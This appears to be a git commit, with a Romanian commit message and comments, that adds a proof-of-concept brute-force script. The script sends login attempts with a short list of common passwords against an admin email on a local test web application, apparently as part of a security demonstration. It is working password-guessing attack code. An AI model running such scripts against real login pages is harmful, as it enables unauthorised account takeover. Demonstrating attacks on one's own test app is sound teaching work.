dcd4cd30bfc5ecf4619dc249cc3a8f1fecc54755
FloreaMihaiAlexandru <alexflorea177@gmail.com>
2026-04-29 16:10:55 +0300

    Adaugat script demonstrativ pentru atacul de tip Brute Force

---
+++ brute_force_poc.py
@@ -0,0 +1,31 @@
+import requests
+
+# Adresa paginii de login din aplicatia noastra
+URL = "http://127.0.0.1:5000/login"
+
+# Email-ul pe care l-am aflat deja prin User Enumeration
+target_email = "admin@authx.com" 
+
+# Lista de parole comune (wordlist) pentru test
+passwords = ["123456", "password", "admin123", "secret", "johnny"]
+
+print(f"--- Incepem atacul Brute Force pe: {target_email} ---")
+
+for pwd in passwords:
+    # Pregatim datele pe care le trimitem in formularul de login
+    data = {
+        "email": target_email,
+        "password": pwd
+    }
+    
+    # Trimitem cererea catre server
+    response = requests.post(URL, data=data)
+    
+    # Daca in raspuns NU mai apare cuvantul "Eroare", inseamna ca am intrat
+    if "Eroare" not in response.text:
+        print(f"[!] SUCCES! Parola gasita este: {pwd}")
+        break
+    else:
+        print(f"[-] Incercare esuata pentru parola: {pwd}")
+
+print("--- Atac finalizat ---")
